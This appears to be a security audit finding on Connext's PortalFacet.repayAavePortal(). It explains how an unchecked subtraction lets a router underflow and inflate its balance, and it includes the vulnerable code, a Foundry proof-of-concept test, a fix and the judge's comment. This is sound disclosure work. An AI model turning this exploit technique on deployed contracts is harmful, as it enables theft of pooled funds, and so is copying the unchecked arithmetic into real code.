@@ -1,0 +1,23 @@
+[H-01]PortcalFacet.repayAavePortal()can trigger an underflow ofrouterBalances
+Submitted by Ruhum, also found by 0x1f8b and WatchPug
+PortalFacet.sol#L80-L113
+The caller ofrepayAavePortal()can trigger an underflow to arbitrarily increase the caller’s balance through an underflow.
+Proof of Concept
+// Relevant code sections:// PortalFacet.solfunctionrepayAavePortal(address_local,uint256_backingAmount,uint256_feeAmount,uint256_maxIn,bytes32_transferId)external{uint256totalAmount=_backingAmount+_feeAmount;// in adopteduint256routerBalance=s.routerBalances[msg.sender][_local];// in local// Sanity check: has that much to spendif(routerBalance<_maxIn)revertPortalFacet__repayAavePortal_insufficientFunds();// Need to swap into adopted asset or asset that was backing the loan// The router will always be holding collateral in the local asset while the loaned asset// is the adopted asset// Swap for exact `totalRepayAmount` of adopted asset to repay aave(boolsuccess,uint256amountIn,addressadopted) =AssetLogic.swapFromLocalAssetIfNeededForExactOut(_local,totalAmount,_maxIn);if(!success)revertPortalFacet__repayAavePortal_swapFailed();// decrement router balancesunchecked{s.routerBalances[msg.sender][_local] -=amountIn;}// back loan_backLoan(_local,_backingAmount,_feeAmount,_transferId);}// AssetLogic.solfunctionswapFromLocalAssetIfNeededForExactOut(address_asset,uint256_amount,uint256_maxIn)internalreturns(bool,uint256,address){AppStoragestorages=LibConnextStorage.connextStorage();// Get the token id(,bytes32id) =s.tokenRegistry.getTokenId(_asset);// If the adopted asset is the local asset, no need to swapaddressadopted=s.canonicalToAdopted[id];if(adopted==_asset) {return(true,_amount,_asset);}return_swapAssetOut(id,_asset,adopted,_amount,_maxIn);}
+First, callrepayAavePortal()where_backingAmount + _feeAmount > s.routerBalances[msg.sender][_local] && _maxIn > s.routerBalances[msg.sender][_local]. That will trigger the call to the AssetLogic contract:
+(boolsuccess,uint256amountIn,addressadopted) =AssetLogic.swapFromLocalAssetIfNeededForExactOut(_local,totalAmount,_maxIn);
+By setting_localto the same value as the adopted asset, you trigger the following edge case:
+addressadopted=s.canonicalToAdopted[id];if(adopted==_asset) {return(true,_amount,_asset);}
+So theamountInvalue returned byswapFromLocalAssetIfNeededForExactOut()is thetotalAmountvalue that was passed to it. AndtotalAmount == _backingAmount + _feeAmount.
+Meaning theamountInvalue is user-specified for this edge case. Finally, we reach the following line:
+unchecked{s.routerBalances[msg.sender][_local] -=amountIn;}
+amountIn(user-specified) is subtracted from therouterBalancesin anuncheckedblock. Thus, the attacker is able to trigger an underflow and increase their balance arbitrarily high. TherepayAavePortal()function only verifies thatrouterBalance < _maxIn.
+Here’s a test as PoC:
+// PortalFacet.t.solfunctiontest_PortalFacet_underflow()public{s.routerPermissionInfo.approvedForPortalRouters[router] =true;uintbacking=2ether;uintfee=10000;uintinit=1ether;s.routerBalances[router][_local] =init;s.portalDebt[_id] =backing;s.portalFeeDebt[_id] =fee;vm.mockCall(s.aavePool,abi.encodeWithSelector(IAavePool.backUnbacked.selector),abi.encode(true));vm.prank(router);this.repayAavePortal(_local,backing,fee,init-0.5ether,_id);// balance > init => underflowrequire(s.routerBalances[router][_local] >init);}
+Recommended Mitigation Steps
+After the call toswapFromLocalAssetIfNeededForExactOut()you should add the following check:
+if(_local==adopted) {require(routerBalance>=amountIn);}
+LayneHaber (Connext) confirmed and resolved:
+connext/nxtp@ac95c1b
+0xleastwood (judge) commented:
+This is entirely valid and a really severe issue. If the local asset is the adopted asset,AssetLogic.swapFromLocalAssetIfNeededForExactOut()will returnamountIn == totalAmount. So in order to overflowrouterBalances, the router just needs to provide_backingAmount + _feeAmountinputs that sum to exceed the router’s current balance.
